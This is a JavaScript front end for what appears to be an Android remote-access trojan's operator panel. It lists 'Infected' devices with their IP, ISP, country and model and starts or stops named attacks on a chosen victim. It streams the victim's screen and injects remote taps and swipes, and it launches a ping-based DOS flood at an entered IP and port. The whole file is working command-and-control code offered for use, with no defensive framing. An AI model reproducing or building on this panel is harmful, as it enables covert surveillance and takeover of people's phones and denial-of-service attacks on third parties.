const infected = document.getElementById("infected")
const infos = document.getElementById("infos")
const form = document.getElementById("left")
const img = document.getElementById("img")
const androidScreen = document.getElementById("imgSrc")
let CurrentDevice = ""
let CurrentAttack = ""



/* Clearing */
form.reset()
infos.innerHTML = '<div class="info">    <span>Country :</span>    <span>--</span></div><div class="info">    <span>ISP :</span>    <span>--</span></div><div class="info">    <span>IP :</span>    <span>--</span></div><div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div>'





function stopAttack(){
    // STOPING CURRENT ATTACK
    if(CurrentAttack != ""){
        msgSend(CurrentDevice,CurrentAttack,"stop")
        ele = document.querySelector('input[name="attack"]:checked')
        if(ele != null){
            ele.checked = false
        }
        CurrentAttack = ""

        // console.log(CurrentAttack,ele)
    }
}

function DOS(val){
    if(val){
        // START DOS (PING) ATTACK
        if(!(pingIp.value == "" || pingPort.value == "" || pingWait.value == "  ")){
            msgSend("","ping","start",pingIp.value,pingPort.value,pingWait.value)
            pingStop.disabled = false
            pingStart.disabled = true
        }else{
            alert(42)
        }
    }else{
        msgSend("","ping","stop")
        pingStop.disabled = true
        pingStart.disabled = false
    }
}


async function getInfo(id){
    await stopAttack()
    if(id != "None"){
        $.ajax({
            url : document.location.origin+'/info',
            method : 'POST',
            type : 'POST',
            data : {
                id : id,
            },
            success : async (data)=>{
                // console.log(data)
                await stopAttack()
                CurrentDevice = id
                tmp = ""
                delete data['ID']
                for(i in data){
                    tmp += `<div class="info">
                    <span>${i} :</span>
                    <span>${data[i]}</span>
                </div>` 
                }
                infos.innerHTML = tmp
            }
        })
    }else{
        CurrentDevice = ""
        infos.innerHTML = '<div class="info">    <span>Country :</span>    <span>--</span></div><div class="info">    <span>ISP :</span>    <span>--</span></div><div class="info">    <span>IP :</span>    <span>--</span></div><div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div>'
    }
}


/** Loging Particals */
// Particles.init({
//     selector: '#bgParticals',
//     color : "#ffffff",
//     connectParticles : true,
//     maxParticles : 50
// });
/** Loging Particals */



/** Making Socket Connections */
const socket = io(`ws://${document.location.hostname}:4001/`,{transports: ['websocket'], upgrade: false})
const output = document.getElementById("output")

socket.on("logger",(data)=>{
    // console.log(data)
    output.append(data+"\n")
    output.scrollTo(0,output.scrollTopMax) 
})

socket.on("img",(data)=>{
    img.src = "data:image/jpeg;charset=utf-8;base64,"+data 
})

socket.on("info",(data)=>{
    // console.log(data)
    infected.innerHTML = '<option data-display="Infected">None</option>'
    data.forEach(i=>{
        infected.insertAdjacentHTML("beforeend",`<option value="${i.ID}">${i.Brand} (${i.Model})</option>`) 
    })
    $("select").niceSelect("update")
})


/** Making Socket Connections */



/** Functions */
function msgSend(id,emit,...args){
    $.ajax({
        url : document.location.origin+'/send',
        method : 'POST',
        type : 'POST',
        data : {
            emit : emit,
            id : id,
            args : JSON.stringify(args)
        },
        success : (data)=>{
            console.log(data)
        }
    })
}

// Function for selecting only one check box in a group
$('input[type="checkbox"]').on('change', async function() {
    if(this.checked){
        $('input[name="' + this.name + '"]').not(this).prop('checked', false);
    }

    console.log(this)
    if(CurrentAttack == "screen"){
        androidScreen.style.opacity = "0"
        androidScreen.style.pointerEvents = "none"
        rightBG.style.opacity = "1"
        output.style.opacity = "1"
    }

    await stopAttack()
    

    CurrentAttack = this.value

    if(this.checked && CurrentAttack == "screen"){
        androidScreen.style.opacity = "1"
        androidScreen.style.pointerEvents = "all"
        rightBG.style.opacity = "0"
        output.style.opacity = "0"
    }


    // console.log(CurrentDevice,this.value,"start")
    if(this.checked){
        msgSend(CurrentDevice,this.value,"start")
    }else{
        CurrentAttack = ""
    }
    
});
// androidScreen.style.opacity = "1"
// androidScreen.style.pointerEvents = "all"
// rightBG.style.opacity = "0"
// output.style.opacity = "0"

/* Debug info *
const  txt  = document.getElementById("txt")
function update(x,y) {
    txt.innerHTML = `x : ${x}<Br>y : ${y}`  
}
img.addEventListener("mousemove",(evt)=>{
    // console.log(evt)
    x = ((evt.clientX - evt.target.getBoundingClientRect().x)/evt.target.width)*100
    y = ((evt.clientY - evt.target.getBoundingClientRect().y)/evt.target.height)*100
    update(x,y)
})
/* Debug info */


img.addEventListener("mousedown",(evt)=>{
    clickX1 = evt.clientX
    clickY1 = evt.clientY
})
img.addEventListener("mouseup",(evt)=>{
    var type = ""
    if(evt.clientX == clickX1 && evt.clientY == clickY1){
        x1 = ((evt.clientX - evt.target.getBoundingClientRect().x)/evt.target.width)*evt.target.naturalWidth
        y1 = ((evt.clientY - evt.target.getBoundingClientRect().y)/evt.target.height)*evt.target.naturalHeight

        
        args = {
            "x" : x1.toFixed(4),
            "y" : y1.toFixed(4)
        }
        type = "click"
        console.log("click",args)
    }else{
        x1 = ((clickX1 - evt.target.getBoundingClientRect().x)/evt.target.width)*evt.target.naturalWidth
        y1 = ((clickY1 - evt.target.getBoundingClientRect().y)/evt.target.height)*evt.target.naturalHeight
        x2 = ((evt.clientX - evt.target.getBoundingClientRect().x)/evt.target.width)*evt.target.naturalWidth
        y2 = ((evt.clientY - evt.target.getBoundingClientRect().y)/evt.target.height)*evt.target.naturalHeight
        args = {
            "x1" : x1.toFixed(4),
            "y1" : y1.toFixed(4),
            "x2" : x2.toFixed(4),
            "y2" : y2.toFixed(4)
        }
        type = "drag"
        console.log("drag",args)
    }
    socket.emit("mouse",{
        type : type,
        points : JSON.stringify(args)
    })
})

const cursor = document.getElementById("cursor")
document.addEventListener("mousemove",(evt)=>{
    cursor.style.top = evt.clientY + "px"
    cursor.style.left = evt.clientX + "px"
})


$(document).ready(()=>{
    $("select").niceSelect()
}) 
